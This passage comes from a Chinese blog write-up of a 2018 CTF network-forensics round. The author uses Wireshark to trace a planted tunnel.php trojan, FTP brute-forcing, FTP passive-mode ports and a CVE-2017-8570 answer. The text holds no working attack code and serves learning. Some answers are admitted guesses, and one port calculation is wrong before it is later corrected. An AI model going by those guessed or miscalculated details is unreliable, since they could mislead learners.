(700114939.png).png"><br>经过分析，是新建的一个木马文件<code>tunnel.php</code>，作用是设置代理，监听端口。<br>所以，黑客是通过修改<code>obj_edit.php</code>文件，配合<code>tunnel.php</code>进行下一步行动。关卡<code>10</code>搞定。<br>第七个数据包分析完毕。</p><h5 id="关卡11-04"><a href="#关卡11-04" class="headerlink" title="关卡11~04"></a>关卡11~04</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1959216493.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3344628515.png" alt="clipboard (3344628515.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3452440425.png" alt="clipboard (3452440425.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/469606264.png" alt="clipboard (469606264.png).png"><br>打个岔，这次比赛我觉得从关卡<code>11</code>到关卡<code>14</code>都不好做，对于我个人而言，我是在<code>13</code>点之前做完全部的数据分析题的，九点开始的比赛，前十个问题我花了两个多小时完成，剩下的全部花在后四题。。。<br>打开第八个数据包，结合关卡<code>11</code>的问题，一脸懵逼。。后面发现端口<code>1433</code>即是<code>ftp</code>开放的端口（别问为什么，这题我真是懵的，我刚开始蒙<code>22</code>,错了，后面看到这个<code>1433</code>，试一下，竟然对了）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3383591559.png" alt="clipboard.png"><br>关卡<code>11</code>搞定（懵的，请老哥们指教）。<br>剩下的第八个数据包的分组，可以分析得知，黑客在爆破<code>ftp</code>的账号和密码，但是没成功。</p><p>接着打开第九个数据包，过滤分析<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/686413240.png" alt=")cjc$of8q224.png"><br>这个<code>ftp</code>登录密码我是怎么找到并最终确认的呢？因为观察了下，下面那个标记的数据包是第一个<code>ftp</code>的命令操作，而离这个<code>ftp</code>命令最近的密码是<code>62236</code>显示的内容 ，我才提交并确认这个密码的。关卡<code>12</code>搞定。<br>剩下的关卡<code>11</code>和关卡<code>14</code>我是怎么做出来的呢？我下面写的，你可能觉得这是运气，但，不得不承认，这是<code>wireshark</code>的一个功能，而我恰好知道。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2355818266.png" alt="clipboard.png"><br>当我做完关卡<code>11</code>后，剩下<code>http</code>数据包特别多，长时间分析无果，我换了个思路，把数据包的分组按<code>Length</code>排序，而不是按分组号排序。<br>查看第一个包，就会发现有个<code>readmd.rtf</code>(比赛的时候提交错误，后面问了小丢姐姐，姐姐说把第二个d改成e)<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1748470214.png" alt="clipboard.png"><br>为啥我最后可以确定答案是<code>readmd.rtf</code>去向小丢姐姐问是不是原本的答案有错呢？<br>因为，在接下来的分析中，我找到了另外一个显示目录的分组，下面是它们的对比。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2128565827.png" alt="clipboard (2128565827.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1895590368.png" alt="clipboard (1895590368.png).png"><br>可以发现，时间的误差和新文件的写入正好符合时间差。所以，关卡12搞定。</p><p>最后就剩下了个关卡14了。。。这个。真的。。。。又是懵的。<br>最后一题在剩余最后四题又是做的最久的。<br>这里考察了一个知识点：<br><code>227 Entering Passive Mode (127,0,0,1,26,80).</code>代表客户机使用PASV模式连接服务器的<code>26x256+108=6764</code>端口。<br>然后过滤<code>IP</code>，找到端口。（等会讲讲）<br>但是那时候我不会啊。。不知道啊。。。咋办，继续找呗。。。后面发现了这个<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1229795221.png" alt="clipboard.png"><br>这个<code>CVE-2017-8570</code>即是最后的答案。。。</p><p>在分析过程中，我也看到了这个，还郁闷怎么会有这玩意来着。。后面，卡最后一题实在太久了，小丢姐姐也问我们还有没有没吃饭的，我就乖乖地去吃饭饭了。吃饭过程，想了想，不对啊，那个<code>CVE</code>是干啥的，会不会就是最后一题答案，越想越觉得有这可能，扒了几口饭就回去提交，提交前口里喊了一声“圣光请赐予我力量”。弹出提示，“恭喜你，完成本比赛所有关卡，并给予30%的总分额外奖励”，队友这个时候疯狂摸我大腿，口里念叨着“大佬大佬大佬啊”。<br>真变态，人家可是腼腆羞涩的纯情单身大男孩呢。</p><h4 id="迷之坑点"><a href="#迷之坑点" class="headerlink" title="迷之坑点"></a>迷之坑点</h4><p>虽然，数据赛拿了满分，但是，其中还是有些问题和坑点，下面介绍</p><h5 id="坑点一"><a href="#坑点一" class="headerlink" title="坑点一"></a>坑点一</h5><p>关卡<code>14</code>的正确方法解题模式<br>这里介绍两种方法，一种是按tcp端口过滤，另一种是在<code>wireshark</code>中改变ftp端口号。<br>第一种方法：<br>先介绍下<code>FTP</code>的连接模式：其有两种方式，<code>PORT</code>（主动模式）和<code>PASV</code>（被动模式），均是相对于服务器而言的。<br>一、以<code>PORT</code>模式连接服务器的情况。其中在<code>LOG</code>里有这样的记录：<br><code>PORT 127,0,0,1,28,37</code>告诉服务器当收到这个<code>PORT</code>指令后，连接<code>FTP</code>客户的<code>28x256+37=7205</code>这个端口<br><code>Accepting connection: 127.0.0.1:20</code> 表示服务器接到指令后用<code>20</code>端口连接<code>7205</code>端口，而且被<code>FTP</code>客户接受。<br>二、以PASV模式连接服务器，连接LOG里有这样几句话：<br><code>227 Entering Passive Mode (127,0,0,1,26,80)</code>.代表客户机使用<code>PASV</code>模式连接服务器的<code>26x256+80=6736</code>端口。（当然服务器要支持这种模式）<br><code>125 Data connection already open; Transfer starting.</code>说明服务器的这个端口可用，返回ACK信息。</p><p>两者的计算方式其实是一样的。（之前以为是两种不同的计算方式，经大佬们的提醒后修正）</p><p>而在最后一个流量包中，又仔细分析了下，发现有两种：<br>第一种是<code>227 Entering Passive Mode (192,168,2,108,39,78).</code>如图：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3440594870.png" alt="clipboard (3440594870.png).png"><br>第二种是<code>227 Entering Passive Mode (192,168,2,108,39,79).</code>如图<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4195715713.png" alt="clipboard (4195715713.png).png"><br>按照上面的说法，两者都是<code>ftp</code>以<code>PASV</code>模式连接服务器，按照计算公式依次计算为:<br><code>39*256+78=10062</code><br><code>39*256+79=10063</code><br>发现<code>tcp</code>存在这两个端口，并在<code>10062</code>端口中找到了正确的关卡<code>14</code>的答案。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1218808977.png" alt="clipboard (1218808977.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3075863408.png" alt="clipboard (3075863408.png).png"><br>相关链接：<br><a href="https://blog.csdn.net/chary8088/article/details/1538573" target="_blank" rel="noopener">https://blog.csdn.net/chary8088/article/details/1538573</a>（这个链接里面讲到的内容可能有误，建议看下面的链接）<br><a href="https://blog.csdn.net/bestone0213/article/details/41892921" target="_blank" rel="noopener">https://blog.csdn.net/bestone0213/article/details/41892921</a><br>第二种方法：<br>在做题过程中，我们知道了<code>ftp</code>服务器放到了<code>1433</code>端口，<code>wireshark</code>中设置一波就行：<code>编辑-&gt;首选项-&gt;Protocols-&gt;ftp</code>,修正下端口号即可，然后再过滤语句<code>ftp-data</code>一番，查看其中的分组即可（这次栽在这个点了，说来说去经验不足，这个思路没想过，说明这个知识点应用的不够多）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/13103930.png" alt="46465.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3866312784.png" alt="123165.png"><br>额。。。。。这个点算是搞定了，要去看看<code>ftp</code>咯。</p><h5 id="坑点二"><a href="#坑点二" class="headerlink" title="坑点二"></a>坑点二</h5><p>比赛的时候，在第七个数据包中发现存在一个<code>ELF</code>文件，不知道这干嘛的？（那时候还以为是要我搞<code>pwn</code>）请大佬们指教？<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1559655328.png" alt="clipboard"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/411242816.png" alt="clipboard"></p><p>这干啥的呢？</p><p>数据赛到此为止。先去找找相应的知识点补补。企业赛和个人赛得缓缓。写下这篇文章，废话较多，主要是留给学弟学妹和初学者们，还望大佬们多多指教。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据分析赛：&lt;br&gt;这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。&lt;br&gt;相对上个星期&lt;code&gt;05.05&lt;/code&gt;的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="线下赛事" scheme="https://jianghuxia.github.io/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B%E4%BA%8B/"/>
    
  </entry>
  
</feed>
